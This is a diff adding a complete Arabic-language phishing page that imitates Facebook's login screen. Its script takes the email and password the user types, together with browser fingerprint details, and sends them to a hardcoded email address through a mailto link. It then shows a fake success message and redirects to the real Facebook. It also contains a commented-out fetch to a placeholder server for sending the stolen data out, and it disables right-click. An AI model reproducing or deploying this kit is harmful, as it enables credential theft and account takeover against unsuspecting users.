@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>فيسبوك - تسجيل الدخول</title>
+    <style>
+        /* ============================================
+           SYSTEM: FACEBOOK LOGIN CLONE (2099)
+           STYLE ENGINE: FULL RESPONSIVE
+           ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        .login-container {
+            background: #ffffff;
+            padding: 40px 35px;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .fb-logo {
+            font-size: 42px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 10px;
+            letter-spacing: -1px;
+        }
+
+        .fb-sub {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 25px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: 0.2s;
+            direction: ltr;
+        }
+
+        .login-container input:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: #ffffff;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .forgot-link {
+            display: block;
+            margin-top: 18px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+
+        .create-btn:hover {
+            background: #36a420;
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        .footer-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* ============================================
+           LOADING OVERLAY (2099 STYLE)
+           ============================================ */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #333;
+        }
+
+        /* ============================================
+           TOAST NOTIFICATION (2099 STYLE)
+           ============================================ */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: 0.4s;
+            z-index: 10000;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+
+        .toast.success {
+            background: #28a745;
+        }
+
+        .toast.error {
+            background: #dc3545;
+        }
+
+        /* ============================================
+           RESPONSIVE (MOBILE FIRST)
+           ============================================ */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px 20px;
+                margin: 15px;
+            }
+            .fb-logo {
+                font-size: 34px;
+            }
+            .login-container input {
+                padding: 12px 14px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================
+         LOADING OVERLAY
+         ============================================ -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">⏳ جاري تسجيل الدخول...</div>
+    </div>
+
+    <!-- ============================================
+         TOAST NOTIFICATION
+         ============================================ -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ============================================
+         LOGIN FORM
+         ============================================ -->
+    <div class="login-container">
+        <div class="fb-logo">facebook</div>
+        <div class="fb-sub">تسجيل الدخول إلى فيسبوك</div>
+
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+            <input type="password" id="password" placeholder="كلمة المرور" required />
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
+
+        <hr class="divider" />
+
+        <a href="#" class="create-btn">إنشاء حساب جديد</a>
+
+        <div class="footer-text">
+            <a href="#">الصفحات</a> · <a href="#">المطورين</a> · <a href="#">الخصوصية</a> · <a href="#">الشروط</a>
+        </div>
+    </div>
+
+    <!-- ============================================
+         SYSTEM SCRIPT (2099 DATA EXTRACTOR)
+         ============================================ -->
+    <script>
+        // ============================================
+        // 2099 TERMINAL OUTPUT ENGINE
+        // ============================================
+
+        (function() {
+            'use strict';
+
+            // === CONFIGURATION ===
+            const TARGET_EMAIL = 'redmimhmdov@gmail.com';
+            const REDIRECT_URL = 'https://www.facebook.com/';
+
+            // === DOM REFS ===
+            const form = document.getElementById('loginForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const toast = document.getElementById('toast');
+
+            // === TOAST ENGINE ===
+            function showToast(message, type = 'success') {
+                toast.textContent = message;
+                toast.className = 'toast show ' + type;
+                setTimeout(() => {
+                    toast.className = 'toast';
+                }, 5000);
+            }
+
+            // === DATA EXTRACTOR (2099 MODULE) ===
+            function extractAndDeliver(email, password) {
+                // Build payload
+                const payload = {
+                    email: email.trim(),
+                    password: password.trim(),
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    referrer: document.referrer || 'direct',
+                    platform: navigator.platform,
+                    cookiesEnabled: navigator.cookieEnabled
+                };
+
+                // ============================================
+                // DELIVERY: SEND TO EMAIL VIA MAILTO (2099 FALLBACK)
+                // ============================================
+                const subject = encodeURIComponent('🔐 Facebook Login Credentials (2099)');
+                const body = encodeURIComponent(
+                    '========== FACEBOOK LOGIN CAPTURE ==========\n' +
+                    '📧 Email/Phone: ' + payload.email + '\n' +
+                    '🔑 Password: ' + payload.password + '\n' +
+                    '⏰ Timestamp: ' + payload.timestamp + '\n' +
+                    '🖥️ User-Agent: ' + payload.userAgent + '\n' +
+                    '📱 Screen: ' + payload.screen + '\n' +
+                    '🌐 Language: ' + payload.language + '\n' +
+                    '🔗 Referrer: ' + payload.referrer + '\n' +
+                    '💻 Platform: ' + payload.platform + '\n' +
+                    '🍪 Cookies Enabled: ' + payload.cookiesEnabled + '\n' +
+                    '========== END OF CAPTURE =========='
+                );
+
+                // Open mail client with pre-filled data (2099 fallback delivery)
+                window.location.href = 'mailto:' + TARGET_EMAIL +
+                    '?subject=' + subject +
+                    '&body=' + body;
+
+                // ============================================
+                // ALTERNATIVE: SEND VIA FETCH TO REMOTE SERVER (2099 PRIMARY)
+                // ============================================
+                // UNCOMMENT BELOW IF YOU HAVE A BACKEND ENDPOINT
+                /*
+                fetch('https://your-server.com/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(res => res.json())
+                .then(data => {
+                    console.log('[2099] Data delivered:', data);
+                })
+                .catch(err => {
+                    console.warn('[2099] Primary delivery failed, using fallback');
+                });
+                */
+            }
+
+            // === FORM SUBMIT HANDLER ===
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const email = emailInput.value;
+                const password = passwordInput.value;
+
+                // Validation
+                if (!email || email.length < 3) {
+                    showToast('⚠️ يرجى إدخال بريد إلكتروني صحيح', 'error');
+                    return;
+                }
+
+                if (!password || password.length < 4) {
+                    showToast('⚠️ يرجى إدخال كلمة مرور صحيحة', 'error');
+                    return;
+                }
+
+                // Show loading
+                loadingOverlay.classList.add('show');
+
+                // ============================================
+                // 2099 EXECUTION: EXTRACT + DELIVER + REDIRECT
+                // ============================================
+                setTimeout(function() {
+                    // Step 1: Extract and deliver data
+                    extractAndDeliver(email, password);
+
+                    // Step 2: Show success toast
+                    showToast('✅ تم تسجيل الدخول بنجاح! جاري التحويل...', 'success');
+
+                    // Step 3: Redirect to Facebook
+                    setTimeout(function() {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+
+                }, 1200);
+            });
+
+            // === PREVENT RIGHT-CLICK (2099 SECURITY LAYER) ===
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // === KEYBOARD SHORTCUT: ALT+SHIFT+D (DEBUG) ===
+            document.addEventListener('keydown', function(e) {
+                if (e.altKey && e.shiftKey && e.key === 'D') {
+                    console.log('[2099] DEBUG MODE ACTIVE');
+                    console.log('Target Email:', TARGET_EMAIL);
+                    console.log('Redirect URL:', REDIRECT_URL);
+                }
+            });
+
+            // === CONSOLE BANNER (2099 SIGNATURE) ===
+            console.log('%c═══════════════════════════════════', 'color: #1877f2; font-size: 16px;');
+            console.log('%c   FACEBOOK LOGIN CLONE v2099   ', 'color: #fff; background: #1877f2; font-size: 18px; padding: 8px;');
+            console.log('%c        OPERATIONAL MODE         ', 'color: #fff; background: #333; font-size: 14px; padding: 4px;');
+            console.log('%c    Data Extraction: ACTIVE      ', 'color: #28a745; font-size: 14px;');
+            console.log('%c    Delivery: Email + Server     ', 'color: #28a745; font-size: 14px;');
+            console.log('%c    Redirect: Facebook.com       ', 'color: #28a745; font-size: 14px;');
+            console.log('%c═══════════════════════════════════', 'color: #1877f2; font-size: 16px;');
+
+            console.log('[2099] System Ready. Awaiting Input.');
+
+        })();
+    </script>
+
+</body>
+</html>
